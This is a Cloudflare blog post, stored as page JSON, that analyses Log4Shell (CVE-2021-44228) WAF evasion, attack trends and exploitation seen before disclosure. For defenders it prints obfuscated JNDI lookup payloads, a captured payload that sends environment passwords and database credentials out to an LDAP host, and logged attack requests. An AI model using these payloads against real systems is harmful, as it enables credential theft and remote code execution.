{
	"footerBlurb": "Cloudflare's connectivity cloud protects <a target='_blank' href='https://www.cloudflare.com/network-services/' rel='noreferrer'>entire corporate networks</a>, helps customers build <a target='_blank' href='https://workers.cloudflare.com/' rel='noreferrer'>Internet-scale applications efficiently</a>, accelerates any <a target='_blank' href='https://www.cloudflare.com/performance/accelerate-internet-applications/' rel='noreferrer'>website or Internet application</a>, <a target='_blank' href='https://www.cloudflare.com/ddos/' rel='noreferrer'>wards off DDoS attacks</a>, keeps <a target='_blank' href='https://www.cloudflare.com/application-security/' rel='noreferrer'>hackers at bay</a>, and can help you on <a target='_blank' href='https://www.cloudflare.com/products/zero-trust/' rel='noreferrer'>your journey to Zero Trust</a>.<br/><br/>Visit <a target='_blank' href='https://one.one.one.one/' rel='noreferrer'>1.1.1.1</a> from any device to get started with our free app that makes your Internet faster and safer.<br/><br/>To learn more about our mission to help build a better Internet, <a target='_blank' href='https://www.cloudflare.com/learning/what-is-cloudflare/' rel='noreferrer'>start here</a>. If you&apos;re looking for a new career direction, check out <a target='_blank' href='http://www.cloudflare.com/careers' rel='noreferrer'>our open positions</a>.",
	"initialReadingTime": "4",
	"locale": "en-us",
	"localesAvailable": [
		"zh-cn",
		"zh-tw",
		"fr-fr",
		"de-de",
		"ja-jp",
		"ko-kr"
	],
	"post": {
		"authors": [
			{
				"name": "John Graham-Cumming",
				"slug": "john-graham-cumming",
				"bio": null,
				"profile_image": "https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5vGNsXzZrtSLn2X30pnpUY/6f350e7dd36058a6422f9199b452bb02/john-graham-cumming.jpg",
				"location": "Lisbon, Portugal",
				"website": null,
				"twitter": null,
				"facebook": null,
				"publiclyIndex": true
			},
			{
				"name": "Celso Martinho",
				"slug": "celso",
				"bio": "From when Mosaic took over Gopher. Engineering Director at Cloudflare.",
				"profile_image": "https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2pzgat1zmt1oF1byi7hskH/7b25e8e00117ee44afe36ad27d7d8032/celso.png",
				"location": "Portugal, Lisbon",
				"website": "https://celso.io/",
				"twitter": "@celso",
				"facebook": null,
				"publiclyIndex": true
			}
		],
		"excerpt": "This article covers WAF evasion patterns and exfiltration attempts, trend data on attempted exploitation, and information on exploitation that we saw prior to the public disclosure of CVE-2021-44228.",
		"feature_image": "https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1EhzOb1IaHwVakcdPU9obZ/c9954d969df85716243de7c9dcb78903/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns.png",
		"featured": false,
		"html": "<p>In this blog post we will cover WAF evasion patterns and exfiltration attempts seen in the world, trend data on attempted exploitation, and information on exploitation that we saw prior to the public disclosure of <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228\">CVE-2021-44228</a>.</p><p>In short, we saw limited testing of the vulnerability on December 1, <i>eight days before public disclosure</i>. We saw the <i>first attempt to exploit the vulnerability just nine minutes after public disclosure</i> showing just how fast attackers exploit newly found problems.</p><p>We also see mass attempts to evade WAFs that have tried to perform simple blocking, we see mass attempts to <a href=\"https://www.cloudflare.com/learning/security/what-is-data-exfiltration/\">exfiltrate data</a> including secret credentials and passwords.</p>\n    <div class=\"flex anchor relative\">\n      <h3 id=\"waf-evasion-patterns-and-exfiltration-examples\">WAF Evasion Patterns and Exfiltration Examples</h3>\n      <a href=\"#waf-evasion-patterns-and-exfiltration-examples\" aria-hidden=\"true\" class=\"relative sm:absolute sm:-left-5\">\n        <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\"><path fill=\"currentcolor\" d=\"m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z\"></path></svg>\n      </a>\n    </div>\n    <p>Since the <a href=\"https://www.lunasec.io/docs/blog/log4j-zero-day/\">disclosure</a> of CVE-2021-44228 (now commonly referred to as Log4Shell) we have seen attackers go from using simple attack strings to actively trying to evade blocking by WAFs. <a href=\"https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/\">WAFs</a> provide a useful tool for stopping external attackers and WAF evasion is commonly attempted to get past simplistic rules.</p><p>In the earliest stages of exploitation of the Log4j vulnerability attackers were using un-obfuscated strings typically starting with <code>${jndi:dns, ${jndi:rmi</code> and <code>${jndi:ldap</code> and simple rules to look for those patterns were effective.</p><p>Quickly after those strings were being blocked and attackers switched to using evasion techniques. They used, and are using, both standard evasion techniques (escaping or encoding of characters) and tailored evasion specific to the <a href=\"https://logging.apache.org/log4j/2.x/manual/lookups.html\">Log4j Lookups language</a>.</p><p>Any capable WAF will be able to handle the standard techniques. Tricks like encoding <code>${</code> as <code>%24%7B</code> or <code>\\u0024\\u007b</code> are easily reversed before applying rules to check for the specific exploit being used.</p><p>However, the Log4j language has some rich functionality that enables obscuring the key strings that some WAFs look for. For example, the <code>${lower}</code> lookup will lowercase a string. So, <code>${lower:H}</code> would turn into <code>h</code>. Using lookups attackers are disguising critical strings like <code>jndi</code> helping to evade WAFs.</p><p>In the wild we are seeing use of <code>${date}</code>, <code>${lower}</code>, <code>${upper}</code>, <code>${web}</code>, <code>${main}</code> and <code>${env}</code> for evasion. Additionally, <code>${env}</code>, <code>${sys}</code> and <code>${main}</code> (and other specialized lookups for Docker, Kubernetes and other systems) are being used to exfiltrate data from the target processâ€™ environment (including critical secrets).</p><p>To better understand how this language is being used, here is a small Java program that takes a string on the command-line and logs it to the console via Log4j:</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">import org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\npublic class log4jTester{\n    private static final Logger logger = LogManager.getLogger(log4jTester.class);\n       \n    public static void main(String[] args) {\n\tlogger.error(args[0]);\n    }\n}</pre></code>\n            <p>This simple program writes to the console. Here it is logging the single word hide.</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">$ java log4jTester.java &#039;hide&#039;          \n01:28:25.606 [main] ERROR log4jTester - hide</pre></code>\n            <p>The Log4j language allows use of the <code>${}</code> inside <code>${}</code> thus attackers are able to combine multiple different keywords for evasion. For example, the following <code>${lower:${lower:h}}${lower:${upper:i}}${lower:D}e</code> would be logged as the word <code>hide</code>. That makes it easy for an attacker to evade simplistic searching for <code>${jndi</code>, for example, as the letters of <code>jndi</code> can be hidden in a similar manner.</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">$ java log4jTester.java &#039;${lower:${lower:h}}${lower:${upper:i}}${lower:d}e&#039;\n01:30:42.015 [main] ERROR log4jTester - hide</pre></code>\n            <p>The other major evasion technique makes use of the :- syntax. That syntax enables the attacker to set a default value for a lookup and if the value looked up is empty then the default value is output. So, for example, looking up a non-existent environment variable can be used to output letters of a word.</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">$ java log4jTester.java &#039;${env:NOTEXIST:-h}i${env:NOTEXIST:-d}${env:NOTEXIST:-e}&#039; \n01:35:34.280 [main] ERROR log4jTester - hide</pre></code>\n            <p>Similar techniques are in use with <code>${web}</code>, <code>${main}</code>, etc. as well as strings like <code>${::-h}</code> or <code>${::::::-h}</code> which both turn into <code>h</code>. And, of course, combinations of these techniques are being put together to make more and more elaborate evasion attempts.</p><p>To get a sense for how evasion has taken off here&#39;s a chart showing un-obfuscated <code>${jndi:</code> appearing in WAF blocks (the orange line), the use of the <code>${lower}</code> lookup (green line), use of URI encoding (blue line) and one particular evasion that&#39;s become popular <code>${${::-j}${::-n}${::-d}${::-i}</code>(red line).</p>\n            <figure class=\"kg-card kg-image-card kg-width-wide\">\n            \n            <Image src=\"https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6imnpZmBPnDmDdZL5YDHrG/e3fb526beb0d790b907bd16a2ca903a3/image--7-.png\" alt=\"\" class=\"kg-image\" width=\"1994\" height=\"728\" loading=\"lazy\"/>\n            \n            </figure><p>For the first couple of days evasion was relatively rare. Now, however, although naive strings like <code>${jndi:</code> remain popular evasion has taken off and WAFs must block these improved attacks.</p><p>We wrote last week about the initial phases of exploitation that were <a href=\"/inside-the-log4j2-vulnerability-cve-2021-44228/\">mostly about reconnaissance</a>. Since then attackers have moved on to data extraction.</p><p>We see the use of <code>${env}</code> to extract environment variables, and <code>${sys}</code> to get information about the system on which Log4j is running. One attack, blocked in the wild, attempted to exfiltrate a lot of data from various Log4j lookups:</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">${${env:FOO:-j}ndi:${lower:L}da${lower:P}://x.x.x.x:1389/FUZZ.HEADER.${docker:\nimageName}.${sys:user.home}.${sys:user.name}.${sys:java.vm.version}.${k8s:cont\nainerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx\n:loginId}.${ctx:hostName}.${env:PASSWORD}.${env:MYSQL_PASSWORD}.${env:POSTGRES\n_PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}</pre></code>\n            <p>There you can see the user, home directory, Docker image name, details of Kubernetes and Spring, passwords for the user and databases, hostnames and command-line arguments being exfiltrated.</p><p><b>Because of the sophistication of both evasion and exfiltration WAF vendors need to be looking at any occurrence of ${ and treating it as suspicious.</b> For this reason, we are additionally offering <a href=\"/log4j-cloudflare-logs-mitigation/\">to sanitize any logs</a> we send our customer to convert <code>${</code> to <code>x{</code>.</p><p>The Cloudflare WAF team is continuously working to block attempted exploitation, but it is still vital that customers patch their systems with up-to-date Log4j or apply mitigations. Since data that is logged does not necessarily come via the Internet systems need patching whether they are Internet-facing or not.</p><p>All paid customers have configurable WAF rules to help protect against CVE-2021-44228, and we have also deployed protection for our free customers.</p>\n    <div class=\"flex anchor relative\">\n      <h3 id=\"cve-2021-44228-exploitation-trends\">CVE-2021-44228 Exploitation Trends</h3>\n      <a href=\"#cve-2021-44228-exploitation-trends\" aria-hidden=\"true\" class=\"relative sm:absolute sm:-left-5\">\n        <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\"><path fill=\"currentcolor\" d=\"m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z\"></path></svg>\n      </a>\n    </div>\n    <p>Cloudflare quickly put in place WAF rules to help block these attacks. The following chart shows how those blocked attacks evolved.</p>\n            <figure class=\"kg-card kg-image-card kg-width-wide\">\n            \n            <Image src=\"https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7vRyAqkAVVCcgYXQyAW3He/8d1ee7c2575a6a2106c4641fab7827dc/image3-39.png\" alt=\"\" class=\"kg-image\" width=\"1999\" height=\"496\" loading=\"lazy\"/>\n            \n            </figure><p>From December 10 to December 13 we saw the number of blocks per minute ramp up as follows.</p><table><tr><td><p><b>Date</b></p></td><td><p><b>Mean blocked requests per minute</b></p></td></tr><tr><td><p>2021-12-10</p></td><td><p>5,483</p></td></tr><tr><td><p>2021-12-11</p></td><td><p>18,606</p></td></tr><tr><td><p>2021-12-12</p></td><td><p>27,439</p></td></tr><tr><td><p>2021-12-13</p></td><td><p>24,642</p></td></tr></table><p>In our <a href=\"/actual-cve-2021-44228-payloads-captured-in-the-wild/\">initial blog post</a> we noted that Canada (the green line below) was the top source country for attempted exploitation. As we predicted that did not continue and attacks are coming from all over the world, either directly from servers or via proxies.</p>\n            <figure class=\"kg-card kg-image-card kg-width-wide\">\n            \n            <Image src=\"https://cf-assets.www.cloudflare.com/zkvhlag99gkb/38r1ZNJMpqQQ1qV9aPzfiK/9bd75219c35a9a6f68b7c57633f51e20/image1-72.png\" alt=\"\" class=\"kg-image\" width=\"1999\" height=\"456\" loading=\"lazy\"/>\n            \n            </figure>\n    <div class=\"flex anchor relative\">\n      <h3 id=\"exploitation-of-cve-2021-44228-prior-to-disclosure\">Exploitation of CVE-2021-44228 prior to disclosure</h3>\n      <a href=\"#exploitation-of-cve-2021-44228-prior-to-disclosure\" aria-hidden=\"true\" class=\"relative sm:absolute sm:-left-5\">\n        <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\"><path fill=\"currentcolor\" d=\"m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z\"></path></svg>\n      </a>\n    </div>\n    <p>CVE-2021-44228 was disclosed in a (now deleted) Tweet on 2021-12-09 14:25 UTC:</p>\n            <figure class=\"kg-card kg-image-card \">\n            \n            <Image src=\"https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2H5jJqC0ZOKtwIBxFfXJWX/14ed9c5085d95c34b14e632e131aa9ea/image2-53.png\" alt=\"\" class=\"kg-image\" width=\"500\" height=\"470\" loading=\"lazy\"/>\n            \n            </figure><p>However, our systems captured three instances of attempted exploitation or scanning on December 1, 2021, as follows. In each of these I have obfuscated IP addresses and domain names. These three injected <code>${jndi:ldap}</code> lookups in the HTTP <code>User-Agent</code> header, the <code>Referer</code> header and in URI parameters.</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">2021-12-01 03:58:34\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \n    (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://rb3w24.example.com/x}\nReferer: /${jndi:ldap://rb3w24.example.com/x}\nPath: /$%7Bjndi:ldap://rb3w24.example.com/x%7D\n\n2021-12-01 04:36:50\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \n    (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://y3s7xb.example.com/x}\nReferer: /${jndi:ldap://y3s7xb.example.com/x}\nParameters: x=$%7Bjndi:ldap://y3s7xb.example.com/x%7D\t\t\t\t\t\t\n\n2021-12-01 04:20:30\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \n    (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://vf9wws.example.com/x}\nReferer: /${jndi:ldap://vf9wws.example.com/x}\t\nParameters: x=$%7Bjndi:ldap://vf9wws.example.com/x%7D\t</pre></code>\n            <p>After those three attempts we saw no further activity until nine minutes after public disclosure when someone attempts to inject a <code>${jndi:ldap}</code> string via a URI parameter on a gaming website.</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">2021-12-09 14:34:31\nParameters: redirectUrl=aaaaaaa$aadsdasad$${jndi:ldap://log4.cj.d.example.com/exp}</pre></code>\n            \n    <div class=\"flex anchor relative\">\n      <h3 id=\"conclusion\">Conclusion</h3>\n      <a href=\"#conclusion\" aria-hidden=\"true\" class=\"relative sm:absolute sm:-left-5\">\n        <svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\"><path fill=\"currentcolor\" d=\"m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z\"></path></svg>\n      </a>\n    </div>\n    <p>CVE-2021-44228 is being actively exploited by numerous actors. WAFs are effective as a measure to help prevent attacks from the outside, but they are not foolproof and attackers are actively working on evasions. The potential for exfiltration of data and credentials is incredibly high and the long term risks of more devastating hacks and attacks is very real.</p><p>It is vital to mitigate and patch affected software that uses Log4j now and not wait.</p>",
		"id": "5zmkavCF1c5hkbRKHHOlWf",
		"localeList": {
			"name": "Exploitation of Log4j CVE-2021-44228 before public disclosure and evolution of evasion and exfiltration Config",
			"enUS": "English for Locale",
			"zhCN": "Translated for Locale",
			"zhHansCN": "No Page for Locale",
			"zhTW": "Translated for Locale",
			"frFR": "Translated for Locale",
			"deDE": "Translated for Locale",
			"itIT": "No Page for Locale",
			"jaJP": "Translated for Locale",
			"koKR": "Translated for Locale",
			"ptBR": "No Page for Locale",
			"esLA": "No Page for Locale",
			"esES": "No Page for Locale",
			"enAU": "No Page for Locale",
			"enCA": "No Page for Locale",
			"enIN": "No Page for Locale",
			"enGB": "No Page for Locale",
			"idID": "No Page for Locale",
			"ruRU": "No Page for Locale",
			"svSE": "No Page for Locale",
			"viVN": "No Page for Locale",
			"plPL": "No Page for Locale",
			"arAR": "No Page for Locale",
			"nlNL": "No Page for Locale",
			"thTH": "No Page for Locale",
			"trTR": "No Page for Locale",
			"heIL": "No Page for Locale",
			"lvLV": "No Page for Locale",
			"etEE": "No Page for Locale",
			"ltLT": "No Page for Locale"
		},
		"meta_description": "In this blog post we will cover WAF evasion patterns and exfiltration attempts seen in the wild, trend data on attempted exploitation, and information on exploitation that we saw prior to the public disclosure of CVE-2021-44228.",
		"metadata": {
			"title": "Exploitation of Log4j CVE-2021-44228 before public disclosure and evolution of evasion and exfiltration",
			"description": "In this blog post we will cover WAF evasion patterns and exfiltration attempts seen in the wild, trend data on attempted exploitation, and information on exploitation that we saw prior to the public disclosure of CVE-2021-44228.",
			"imgPreview": "https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6t28V29cQW5pr24SmWhbfO/da44ee890c4daa7f75da2db5ae8f8920/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns-3wwAMt.png"
		},
		"primary_author": {},
		"publicly_index": true,
		"published_at": "2021-12-14T17:48:50.000+00:00",
		"slug": "exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns",
		"tags": [
			{
				"id": "7JF2fsZ3jyQAhuK7QLpTHZ",
				"name": "Log4J",
				"slug": "log4j"
			},
			{
				"id": "cwQv0X1pG0tueXmBQ4uOc",
				"name": "Log4Shell",
				"slug": "log4shell"
			},
			{
				"id": "2pFyOCtANFB5qS6nbtQbVp",
				"name": "Vulnerabilities",
				"slug": "vulnerabilities"
			},
			{
				"id": "lGCLqAT2SMojMzw5b6aio",
				"name": "WAF",
				"slug": "waf"
			},
			{
				"id": "6Mp7ouACN2rT3YjL1xaXJx",
				"name": "Security",
				"slug": "security"
			}
		],
		"title": "Exploitation of Log4j CVE-2021-44228 before public disclosure and evolution of evasion and exfiltration",
		"updated_at": "2025-10-24T10:18:28.672Z",
		"url": "https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns"
	},
	"translations": {
		"posts.by": "By",
		"footer.gdpr": "GDPR",
		"lang_blurb1": "This post is also available in {lang1}.",
		"lang_blurb2": "This post is also available in {lang1} and {lang2}.",
		"lang_blurb3": "This post is also available in {lang1}, {lang2} and {lang3}.",
		"footer.press": "Press",
		"header.title": "The Cloudflare Blog",
		"search.clear": "Clear",
		"search.filter": "Filter",
		"search.source": "Source",
		"footer.careers": "Careers",
		"footer.company": "Company",
		"footer.support": "Support",
		"footer.the_net": "theNet",
		"search.filters": "Filters",
		"footer.our_team": "Our team",
		"footer.webinars": "Webinars",
		"page.more_posts": "More posts",
		"posts.time_read": "{time} min read",
		"search.language": "Language",
		"footer.community": "Community",
		"footer.resources": "Resources",
		"footer.solutions": "Solutions",
		"footer.trademark": "Trademark",
		"header.subscribe": "Subscribe",
		"footer.compliance": "Compliance",
		"footer.free_plans": "Free plans",
		"footer.impact_ESG": "Impact/ESG",
		"posts.follow_on_X": "Follow on X",
		"footer.help_center": "Help center",
		"footer.network_map": "Network Map",
		"header.please_wait": "Please Wait",
		"page.related_posts": "Related posts",
		"search.result_stat": "Results <strong>{search_range}</strong> of <strong>{search_total}</strong> for <strong>{search_keyword}</strong>",
		"footer.case_studies": "Case Studies",
		"footer.connect_2024": "Connect 2024",
		"footer.terms_of_use": "Terms of Use",
		"footer.white_papers": "White Papers",
		"footer.cloudflare_tv": "Cloudflare TV",
		"footer.community_hub": "Community Hub",
		"footer.compare_plans": "Compare plans",
		"footer.contact_sales": "Contact Sales",
		"header.contact_sales": "Contact Sales",
		"header.email_address": "Email Address",
		"page.error.not_found": "Page not found",
		"footer.developer_docs": "Developer docs",
		"footer.privacy_policy": "Privacy Policy",
		"footer.request_a_demo": "Request a demo",
		"page.continue_reading": "Continue reading",
		"footer.analysts_report": "Analyst reports",
		"footer.for_enterprises": "For enterprises",
		"footer.getting_started": "Getting Started",
		"footer.learning_center": "Learning Center",
		"footer.project_galileo": "Project Galileo",
		"pagination.newer_posts": "Newer Posts",
		"pagination.older_posts": "Older Posts",
		"posts.social_buttons.x": "Discuss on X",
		"search.icon_aria_label": "Search",
		"search.source_location": "Source/Location",
		"footer.about_cloudflare": "About Cloudflare",
		"footer.athenian_project": "Athenian Project",
		"footer.become_a_partner": "Become a partner",
		"footer.cloudflare_radar": "Cloudflare Radar",
		"footer.network_services": "Network services",
		"footer.trust_and_safety": "Trust & Safety",
		"header.get_started_free": "Get Started Free",
		"page.search.placeholder": "Search Cloudflare",
		"footer.cloudflare_status": "Cloudflare Status",
		"footer.cookie_preference": "Cookie Preferences",
		"header.valid_email_error": "Must be valid email.",
		"search.result_stat_empty": "Results <strong>{search_range}</strong> of <strong>{search_total}</strong>",
		"footer.connectivity_cloud": "Connectivity cloud",
		"footer.developer_services": "Developer services",
		"footer.investor_relations": "Investor relations",
		"page.not_found.error_code": "Error Code: 404",
		"search.autocomplete_title": "Insert a query. Press enter to send",
		"footer.logos_and_press_kit": "Logos & press kit",
		"footer.application_services": "Application services",
		"footer.get_a_recommendation": "Get a recommendation",
		"posts.social_buttons.reddit": "Discuss on Reddit",
		"footer.sse_and_sase_services": "SSE and SASE services",
		"page.not_found.outdated_link": "You may have used an outdated link, or you may have typed the address incorrectly.",
		"footer.report_security_issues": "Report Security Issues",
		"page.error.error_message_page": "Sorry, we can't find the page you are looking for.",
		"header.subscribe_notifications": "Subscribe to receive notifications of new posts:",
		"footer.cloudflare_for_campaigns": "Cloudflare for Campaigns",
		"header.subscription_confimation": "Subscription confirmed. Thank you for subscribing!",
		"posts.social_buttons.hackernews": "Discuss on Hacker News",
		"footer.diversity_equity_inclusion": "Diversity, equity & inclusion",
		"footer.critical_infrastructure_defense_project": "Critical Infrastructure Defense Project"
	}
}